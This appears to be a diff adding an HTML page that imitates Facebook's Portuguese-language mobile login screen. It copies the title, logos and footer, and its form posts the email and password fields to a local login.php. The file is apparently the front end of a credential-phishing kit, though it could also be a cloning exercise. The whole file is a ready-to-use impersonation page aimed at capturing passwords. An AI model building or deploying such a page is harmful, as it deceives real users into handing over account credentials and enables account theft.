@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<link rel="stylesheet" type="text/css" href="css/computer.css" media="screen and (min-width: 769px)">
+<link rel="stylesheet" type="text/css" href="css/mobile.css" media="screen and (max-width: 768px)">
+<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+<title>Facebook - Entrar ou Cadastrar</title>
+</head>
+
+<body>
+<!--Código para Tela Mobile-->
+<div class="mobile">
+  <div class="mobheader">
+    <img src="images/fblogo.png" class="mobfblogo">
+  </div>
+  <div id="mobapplink" class="clearfix">
+    <a href="#">
+      <img src="images/fbandroid.png" id="mobandroidpic">
+      <div id="getfbandroid">Baixe o Facebook para Android e navegue mais rápido.</div>
+    </a>
+  </div>
+  <div class="mobmaindiv">
+    <div id="mobtextdiv">
+      <form action="login.php" method="post">
+        <input type="text" name="email" class="mobtextbox mobtextbox1" placeholder="Número de celular ou email" required>
+        <input type="password" name="senha" class="mobtextbox mobtextbox2" placeholder="Senha" required>
+        <input type="submit" class="mobloginbutton" value="Entrar">
+      </form>
+    </div>
+    <div id="ordiv">
+      <span id="or">ou</span>
+    </div>
+    <div id="mobcreatediv">
+      <button id="mobcreate">Criar nova conta</button>
+    </div>
+    <div class="mobforgotpw">
+      <a href="#">Esqueceu a senha?</a>
+      <span>·</span>
+      <a href="#">Central de Ajuda</a>
+    </div>
+  </div>
+  <div class="mobfooter">
+    <div id="moblangs">
+      <div class="item1">
+        <li><a href="#" id="mobcurrentlang">Português (Brasil)</a></li>
+        <li><a href="#">தமிழ்</a></li>
+        <li><a href="#">हिन्दी</a></li>
+        <li><a href="#">বাংলা</a></li>
+      </div>
+      <div class="item2">
+        <li><a href="#">മലയാളം</a></li>
+        <li><a href="#">ಕನ್ನಡ</a></li>
+        <li><a href="#">اردو</a></li>
+        <li><a href="#"><i class="fa fa-plus-square-o"></i></a></li>
+      </div>
+    </div>
+    <div class="mobcopyright">
+      <span class="mobfbcopyright"><a href="https://www.facebook.com" target="_blank" id="mobcopyrightfblink">Facebook</a> ©2019</span><br>
+      <span id="mobdisclaimer"> <a href="https://www.linkedin.com/in/kspranav10/" target="_blank" id="mobpranavks">Pranav K S &nbsp<i class="fa fa-linkedin-square"></i></a></span>
+    </div>
+  </div>
+</div>
+</body>
+</html>
